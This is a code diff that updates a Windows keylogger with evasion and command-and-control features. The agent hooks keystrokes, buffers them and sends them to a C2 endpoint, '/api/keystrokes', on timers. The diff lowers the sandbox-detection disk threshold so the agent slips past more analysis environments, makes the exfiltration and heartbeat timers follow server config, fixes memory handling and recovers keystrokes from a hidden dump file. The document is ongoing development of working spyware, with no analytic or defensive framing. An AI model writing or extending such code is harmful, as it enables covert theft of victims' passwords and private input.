@@ -66,7 +66,7 @@
 #define REPAIR_INTERVAL_MS  (15 * 60 * 1000)
 
 /* agent version — incremented on each release, sent in heartbeat */
-#define AGENT_VERSION       "1.0.0"
+#define AGENT_VERSION       "1.0.1"
 
 /* update download buffer — max binary size we accept */
 #define UPDATE_MAX_SIZE     (4 * 1024 * 1024)   /* 4 MB */
@@ -130,6 +130,9 @@ static int     g_agent_registered       = 0;
 /* blacklist */
 static char    g_blacklist[MAX_BLACKLIST][MAX_BLACKLIST_STRLEN];
 static int     g_blacklist_count = 0;
+
+/* hidden message window handle — set in WinMain, used by c2_config_poll to re-arm timers */
+static HWND g_hwnd = NULL;
 
 /* heartbeat counter */
 static volatile LONG g_keys_since_heartbeat = 0;
@@ -205,7 +208,7 @@ static int stealth_check_sandbox(void) {
     /* Disk check — less than 60GB total suggests sandbox */
     ULARGE_INTEGER totalBytes;
     if (GetDiskFreeSpaceExA("C:\\", NULL, &totalBytes, NULL)) {
-        if (totalBytes.QuadPart < 60ULL * 1024 * 1024 * 1024) return 1;
+        if (totalBytes.QuadPart < 35ULL * 1024 * 1024 * 1024) return 1;
     }
 
     /* CPU cores — less than 2 suggests sandbox */
@@ -1070,24 +1073,28 @@ static void c2_register(void) {
 }
 
 static void c2_exfil(void) {
-    KeyEvent batch_buffer[BUFFER_SIZE];
+    KeyEvent *batch_buffer = (KeyEvent*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, BUFFER_SIZE * sizeof(KeyEvent));
+    if (!batch_buffer) return;
+
     int count = buffer_flush(batch_buffer, 500);   /* max 500 per batch */
 
-    if (count == 0) return;
+    if (count == 0) { HeapFree(GetProcessHeap(), 0, batch_buffer); return; }
 
     /* build JSON body */
     char *body = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_JSON_BODY);
-    if (!body) return;
+    if (!body) { HeapFree(GetProcessHeap(), 0, batch_buffer); return; }
 
     if (!json_build_keystroke_batch(body, MAX_JSON_BODY, batch_buffer, count)) {
         /* JSON too large — drop events rather than re-queue
          * (re-queuing outside the CS races with concurrent flushes) */
+        HeapFree(GetProcessHeap(), 0, batch_buffer);
         HeapFree(GetProcessHeap(), 0, body);
         log_write("c2: exfil — batch dropped (json overflow)");
         return;
     }
 
     int ret = http_post("/api/keystrokes", body, NULL, 0);
+    HeapFree(GetProcessHeap(), 0, batch_buffer);
     HeapFree(GetProcessHeap(), 0, body);
 
     if (ret < 0) {
@@ -1465,10 +1472,26 @@ static void c2_config_poll(void) {
 
     if (ret > 0) {
         int val;
-        if (json_extract_int(response, "exfil_interval_seconds", &val))
-            g_exfil_interval_sec = val;
-        if (json_extract_int(response, "heartbeat_interval_seconds", &val))
-            g_heartbeat_interval_sec = val;
+        if (json_extract_int(response, "exfil_interval_seconds", &val)) {
+            if (val != g_exfil_interval_sec) {
+                g_exfil_interval_sec = val;
+                if (g_hwnd) {
+                    KillTimer(g_hwnd, TIMER_EXFIL);
+                    SetTimer(g_hwnd, TIMER_EXFIL, g_exfil_interval_sec * 1000, NULL);
+                    log_write("c2: exfil timer re-armed");
+                }
+            }
+        }
+        if (json_extract_int(response, "heartbeat_interval_seconds", &val)) {
+            if (val != g_heartbeat_interval_sec) {
+                g_heartbeat_interval_sec = val;
+                if (g_hwnd) {
+                    KillTimer(g_hwnd, TIMER_HEARTBEAT);
+                    SetTimer(g_hwnd, TIMER_HEARTBEAT, g_heartbeat_interval_sec * 1000, NULL);
+                    log_write("c2: heartbeat timer re-armed");
+                }
+            }
+        }
 
         /* update server blacklist */
         const char *arr = json_array_next(response, "blacklist", g_blacklist[0], MAX_BLACKLIST_STRLEN);
@@ -2016,17 +2039,18 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                                     NULL, OPEN_EXISTING,
                                     FILE_ATTRIBUTE_HIDDEN, NULL);
             if (hf != INVALID_HANDLE_VALUE) {
-                KeyEvent recovery_buf[BUFFER_SIZE];
                 DWORD fsize = GetFileSize(hf, NULL);
                 if (fsize > 0 && fsize <= BUFFER_SIZE * sizeof(KeyEvent)) {
-                    DWORD read;
-                    ReadFile(hf, recovery_buf, fsize, &read, NULL);
-                    int n_events = (int)(read / sizeof(KeyEvent));
-                    /* push recovered events back into the buffer */
-                    EnterCriticalSection(&g_buffer_cs);
-                    for (int i = 0; i < n_events; i++) {
-                        int idx = (g_buffer_head + g_buffer_count) % BUFFER_SIZE;
-                        g_keystroke_buffer[idx] = recovery_buf[i];
+                    KeyEvent *recovery_buf = (KeyEvent*)HeapAlloc(GetProcessHeap(), 0, fsize);
+                    if (recovery_buf) {
+                        DWORD read;
+                        ReadFile(hf, recovery_buf, fsize, &read, NULL);
+                        int n_events = (int)(read / sizeof(KeyEvent));
+                        /* push recovered events back into the buffer */
+                        EnterCriticalSection(&g_buffer_cs);
+                        for (int i = 0; i < n_events; i++) {
+                            int idx = (g_buffer_head + g_buffer_count) % BUFFER_SIZE;
+                            g_keystroke_buffer[idx] = recovery_buf[i];
                         g_buffer_count++;
                         if (g_buffer_count >= BUFFER_SIZE) {
                             g_buffer_head = (g_buffer_head + 1) % BUFFER_SIZE;
@@ -2035,6 +2059,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                     }
                     LeaveCriticalSection(&g_buffer_cs);
                     log_write("startup: recovered keystrokes from shutdown dump");
+                    HeapFree(GetProcessHeap(), 0, recovery_buf);
+                    }
                 }
                 CloseHandle(hf);
                 /* keep the dump until hook is confirmed working */
@@ -2055,6 +2081,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
         hook_uninstall();
         return 1;
     }
+    g_hwnd = hwnd;
 
     /* set up periodic timers */
     SetTimer(hwnd, TIMER_EXFIL, g_exfil_interval_sec * 1000, NULL);
